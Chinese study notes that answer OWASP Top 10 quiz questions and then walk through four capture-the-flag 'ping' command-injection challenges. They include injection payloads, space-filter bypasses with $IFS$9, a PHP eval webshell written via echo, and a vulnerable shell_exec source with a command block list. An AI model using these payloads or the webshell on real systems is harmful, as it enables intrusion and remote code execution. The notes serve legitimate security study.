# nep第四周

## 观看视频

**1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分） **

top1：注入

top2：失效的身份认证

top3：敏感信息泄露

top4：XML外部实体（XXE）

top5：失效的访问控制

top6：安全配置错误

top7：XSS

top8：不安全的反序列化

top9：使用含有已知漏洞的组件

top10：不足的日志记录和监控

是按照严重程度来排序的。

**2.请翻译一下credential stuffing（1分） **

可能是**填充资料**（按照查的单词来理解的），不会英语，傅师傅不要介意，在学了在学了

**3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分）**

因为攻击者会利用服务器的日志记录不到位，利用一个时间差来进行攻击，这样应用没有及时反应过来就会被入侵从而造成损失。我觉得危害性也挺大的，会造成信息泄露之类的。

**4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分） **

利用checklist对照着指南来进行渗透测试。平时都是做题会提示什么漏洞就去尝试什么漏洞的，而不是一个个去尝试，我觉得得平时多练习，到了真实渗透环境就会比较轻松。

**5.you are only as good as you notes   you are only as good as things you can refer to结合这两句话谈谈你的感想。（2分）**

我觉得我们要多阅读别人写的文章，要站在巨人的肩膀上，而不能自己一个人在那瞎搞，自己学是学不好的，阅读别人的东西之后自己进行思考，然后写出一点不一样的东西来，这样才是我们应该做的。

## 命令执行漏洞

###  什么是命令执行漏洞

应用程序有时候会去调用一些执行系统命令的函数，如system，exec，shell_exec，passthru，peopen，proc_popen等。如果给别有用意的人控制了这些函数的参数，那么就可以将恶意指令拼接正常指令造成命令执行攻击，这就是命令执行漏洞。

### 常用的管道符

```
| ：直接执行后面的语句。例如：127.0.0.1|whoami
```

```
||：如果前面执行语句出错，那么就执行后面的语句，前面的语句只能为假。例如：2||whoami
```

```
&：如果前面的语句为假，那么就执行后面的语句，前面的语句可真可假。例如：127.0.0.1&whoami
```

```
&&：如果前面的语句为假则直接出错，不执行后面的语句，前面的语句只能为真。例如：127.0.0.1&&whoami
```

### 截断符号

```
‘$’‘;’‘|’‘-’‘(’‘)’‘反引号’‘||’‘&&’‘&’‘}’‘{’
```

### 空格的代替

```
<
${IFS}
$IFS$9
%09
```

### 例题

#### ping1

先用这个读一下列表

```
127.0.0.1|ls
```

![image-20210426213309988](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210426213309988.png)

很顺利的就读出来了列表

那就写个木马进去

```
|echo "<?php @eval($_POST[cmd]);?>">1.php
```

![image-20210426213347848](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210426213347848.png)

木马写进去了，连接试试。

发现执行不了。

![image-20210426213422302](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210426213422302.png)

后面才知道`$`要加上`\`转义掉才行

#### ping2

```
127.0.0.1|ls
```

![image-20210426213538938](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210426213538938.png)

可以执行那就试试写木马

```
|echo "<?php @eval(\$_POST[cmd]);?>">shell.php
```

![image-20210426213634052](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210426213634052.png)

#### ping3

这道题把空格给过滤掉了

我这里用$IFS$9代替了空格

```
127.0.0.1$IFS$9&&$IFS$9find$IFS$9/$IFS$9-name$IFS$9"*.txt"
```

![image-20210426213700647](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210426213700647.png)

```
127.0.0.1$IFS$9&&$IFS$9find$IFS$9/$IFS$9-name$IFS$9"f*"
//127.0.0.1 && find / -name "f*"
```

![image-20210426213742872](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210426213742872.png)

找到了个flag在根目录下

![image-20210426213800460](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210426213800460.png)

但是写了过滤，读不了

那就用函数拼接试试

```
127.0.0.1|a=g;cat$IFS$9/fla$a
```

很奇怪什么都不显示

![image-20201208225426976](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20201208225426976.png)

但是如果换成

```
127.0.0.1&a=g;cat$IFS$9/fla$a
```

也就是把|换成&直接就能显示出flag了

![image-20201208225407495](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20201208225407495.png)

#### ping4

先查下列表

```
127.0.0.1|ls
```

发现显示no，被过滤了

![image-20201208225748080](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20201208225748080.png)

用这个试试

```
& dir
```

![image-20201208225827720](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20201208225827720.png)

哎，发现有个备份文件，下载下来就是源码了

```php
<?php
header("Content-Type: text/html;charset=utf-8");
if( isset( $_POST['submit']  ) ) {
    // Get input
    $target = $_REQUEST['site'];
    if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i",  $target )) {
      die("no");
    }
    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?>
```

可以看到很多东西都被过滤掉了

cat echo $不能读取，写木马，拼接函数也不行

在ctf中其实除了cat命令可以读取文件外还有下面这几个也可以读取文件

```
1.more 
2.cat 
3.tac
4.head
5.tail
6.less
7.sort
```

在这道题当中，前面六个命令都被ban掉了，但是还剩下sort可以用

```
payload：&sort /flag
```

![image-20201208232114273](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20201208232114273.png)